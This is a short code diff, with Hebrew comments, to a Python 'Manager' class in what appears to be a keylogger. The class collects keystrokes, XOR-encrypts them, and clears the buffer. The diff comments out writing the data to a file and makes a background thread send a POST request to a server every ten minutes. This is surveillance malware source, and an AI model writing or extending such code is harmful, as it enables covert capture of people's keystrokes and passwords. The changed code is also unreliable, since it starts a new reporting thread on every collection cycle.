@@ -32,18 +32,18 @@ class Manager:
                     encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(self.storageLocation, data)
                     print(encrypted_data)
 
-                    if self.storageLocation == "json":
-                        self.file_writer.Writes_to_file(encrypted_data)
-
-                    elif self.storageLocation == "network":
-                        pass  # שליחה לרשת (לא מוגדר כרגע)
+                    # if self.storageLocation == "json":
+                    #     self.file_writer.Writes_to_file(encrypted_data)                    #
+                    # elif self.storageLocation == "network":
+                    #     pass  # שליחה לרשת (לא מוגדר כרגע)
 
                     self.keylogger.clear_buffer()
+                threading.Thread(target=self.report_status_loop, daemon=True).start()  # הפעל דיווח קבוע
 
                 # אם יש מגבלת זמן והזמן עבר, הפסיק את ההקלטה
                 if self.timeLimit > 0 and time.time() - start_time >= self.timeLimit:
                     self.stop()
-                    threading.Thread(target=self.report_status_loop, daemon=True).start()  # הפעל דיווח קבוע
+                    self.server_status_update("false")
 
             except Exception as e:
                 print(f"Error collecting keystrokes: {e}")
@@ -62,7 +62,7 @@ class Manager:
 
     def report_status_loop(self):
         while self.keep_reporting:
-            self.server_status_update("false")  # עדכן שההקלטה נעצרה
+            RequestManager().handle_request(method='POST')
             time.sleep(600)  # המתן 10 דקות לפני הדיווח הבא
 
     def start(self):
